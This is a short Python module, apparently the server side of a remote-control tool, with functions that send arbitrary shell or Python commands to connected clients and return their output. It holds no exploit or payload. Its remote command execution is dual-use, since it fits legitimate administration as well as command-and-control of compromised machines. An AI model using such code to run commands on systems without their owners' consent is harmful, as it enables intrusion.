""" Shell functionality """
import logging

from utils.timeout_handler import timeoutsetter
from modules.clients import Client


def shell(client: Client, command: str) -> str:
    """ Run shell command on client """
    logging.debug("Sending shell command '%s' to client (%s)", command, client.id)

    client.write(b"SHELL")
    client.write(command.encode())

    with timeoutsetter(client, 60):
        response = client.read().decode()

    logging.debug("Command (%s) output from client (%s): %s", command, client.id, response)
    return response

def python(client: Client, command: str) -> str:
    """ Run python command on client """
    logging.debug("Sending python command '%s' to client (%s)", command, client.id)

    client.write(b"PYTHON")
    client.write(command.encode())

    with timeoutsetter(client, 60):
        response = client.read().decode()

    logging.debug("Python command '%s' output from client (%s): %s", command, client.id, response)
    return response
